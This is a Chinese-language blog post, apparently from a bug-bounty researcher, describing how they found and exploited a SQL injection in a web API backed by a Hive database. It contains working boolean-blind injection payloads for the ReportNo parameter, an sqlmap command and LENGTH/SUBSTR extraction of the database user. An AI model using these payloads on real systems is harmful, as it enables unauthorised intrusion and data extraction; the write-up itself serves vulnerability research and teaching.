---
title: 漏洞挖掘 | 一次数据库是Hive的SQL注入
url: https://mp.weixin.qq.com/s/mfrCvwyr2UigSC6vnjPTTw
source: Doonsec's feed
date: 2026-04-13
fetch_date: 2026-04-14T04:40:06.741978
---

# 漏洞挖掘 | 一次数据库是Hive的SQL注入

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/oQ0sWhcqsVmNIPFVdXK7P4X9C3xLTh0LYo5MHsBPAWIXAxNpEqbdRoq5ib4I2AJtk6b2BKeP1P8KjLNhvNTZSx9VTn2xgth2lWiaFgg9gJDoc/0?wx_fmt=jpeg)

# 漏洞挖掘 | 一次数据库是Hive的SQL注入

原创

进击的HACK
进击的HACK

进击的HACK

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 字数 613，阅读大约需 4 分钟

## 前言

最近挖 SRC 的时候，遇到了一个 SQL 注入点。

数据库类型是 Hive 的，比较少见。整个过程不难，简单记录，避免下次遇到的时候忘了。

## 漏洞挖掘

注入点比较好找，Payload

```
'
''
```

然后手动在系统上点点点
两次不同的
![c787e6037ed79243f346be68dc2b287a.png](https://mmbiz.qpic.cn/mmbiz_png/oQ0sWhcqsVkB4elxBr6kCgClwBueyia5J0CuFCmqhvhk3748LOUQkPjZtxUxM9Ldalia9qCqicv04hBYNp1dzVCmeKXTIyIW7ibibHnqdj5R3e0s/640?from=appmsg "null")

c787e6037ed79243f346be68dc2b287a.png

![9c8138c18c9a4d9758091b6bd439482f.png](https://mmbiz.qpic.cn/mmbiz_png/oQ0sWhcqsVnvRMfByjSzab28bXfczfW582nzBWVfSumViaUZBl1RmJ9FNibAtEiaXRgIiaOXWzhFGDnCA7HSqkASNL6PqI85JyvnOn5z5HwKfIc/640?from=appmsg "null")

9c8138c18c9a4d9758091b6bd439482f.png

很明显的注入点，然后开始尝试拿到数据库名字或者当前数据库的用户名，证明该 SQL 注入点的危害。

我一开始是当 MySQL 数据库的，updatexml、sleep 通通招呼上去，但是报错提示找不到相关函数。

于是，我把注入点的报错信息丢给 AI，问这是什么数据库。
![a008be098f03e2931b2c35bef7dcc093.png](https://mmbiz.qpic.cn/mmbiz_png/oQ0sWhcqsVmpnDibbLNnpaVfR31VPTHWKLWn2zmLusY32S5TQkEvJ5uO5mria9pA54yVgZsibke9ShjoicHztYmrshcic1CIpZsqh0JW92lFmRD4/640?from=appmsg "null")

a008be098f03e2931b2c35bef7dcc093.png

Hive 数据库，没见过，懒得整了，和我的 sqlmap 说去吧

```
python sqlmap.py -r test.txt --level 3 --dbms=hive
```

然而，sqlmap 不支持
![508cd2deb1968469421e5b588e9dcb86.png](https://mmbiz.qpic.cn/mmbiz_png/oQ0sWhcqsVnzWk5rSoJ5wqOrnw4nXNTOpu8DUrXwq4xSVcPd8RLwqDLCPPKicWdR5SXbCA9xpeJV4X5DBWt3nt6a61iaZa79icb08fPLHuO3zI/640?from=appmsg "null")

508cd2deb1968469421e5b588e9dcb86.png

在 issues 中 sqlmap 中有回复，不会做 Hive
![4d18fef05b683a5c2b89474cac73aa93.png](https://mmbiz.qpic.cn/mmbiz_png/oQ0sWhcqsVn32icHJxdeCUwXfACtlv9z0zywrwj8AudaxthicJaq9xqw7Gq0wIA7KZ4mIByHwLns3tev01xHoVBRyDhHgvZEicOFA4FpPUTTvU/640?from=appmsg "null")

4d18fef05b683a5c2b89474cac73aa93.png

只能自己动手了，SQL 语法大差不差。而且现在有了大模型，不用苦兮兮地去翻 Hive 文档了。
分析参数，在查询接口的 API 下

```
?ReportNo=xxxx
```

很大可能是在 where 下面

```
where ReportNo='xxxxx'
```

询问大模型，Hive 有哪些内置函数，哪些函数可以获取用户名

```
current_user()
logged_in_user()
……
```

因为开发对 Hive 的进行了限制，sleep 语句和报错注入语句用不了，只能走布尔盲注的路子。
但是，我找到的这个注入点，里面是空的，布尔值是 true 还是 false，响应包都不会改变。

常言道，SQL 注入就像房间里的蟑螂，一处有，别处肯定还有。

根据上面的 Payload 在 Burpsuite 插件里配置规则
用二开的 xia\_sql
https://github.com/darkfiv/DouSql

![665874f41fb4feaf6ae7878db0f90c27.png](https://mmbiz.qpic.cn/sz_mmbiz_png/oQ0sWhcqsVlHeq4D46PkVY0XskR0icWrO7iaWAdrE2gPSyuVHO7XOKtc8KFtxfQSHxeOzjdBNny5a5T5CnK7llYm18cjeicxWXxdFWYiaDaDDHU/640?from=appmsg "null")

665874f41fb4feaf6ae7878db0f90c27.png

最终找到了五处存在注入点的，其中一处是有东西的。

不过在测试的时候，有一点很奇怪，我一开始是

```
?ReportNo=xxxx' and '1'='1
```

按道理来说没区别，但是这么搞，响应内容就是空的

```
{"code":0,"msg":"成功","data":[]}
```

而换成

```
?ReportNo=xxxx' or '1'='1
```

响应里就有内容

枚举当前用户名

```
?ReportNo=xxxx' or current_user()='aaa
```

用字典成功跑出来了。

正常来说是先判断长度，二分法判断

```
?ReportNo=xxxx' or LENGTH(current_user()) > 0 or '1' = '1
```

逐字符提取

```
?ReportNo=xxxx' or SUBSTR(current_user(), 1, 1) = 'a' or '1'='1
```

## 总结

Hive 数据库的 SQL 注入相较于其他类型的数据库 SQL 注入还是比较小众，算是我第一次遇到。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/a1BOUvqnbrhOdQiaFvupNflYqfzCq5nzdjQF1j9ib5wTPYG8g3txOmd7mu8icbHfWCHTLibYzSOMlRrlLD9EicEESzA/0?wx_fmt=png)

进击的HACK

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/a1BOUvqnbrhOdQiaFvupNflYqfzCq5nzdjQF1j9ib5wTPYG8g3txOmd7mu8icbHfWCHTLibYzSOMlRrlLD9EicEESzA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过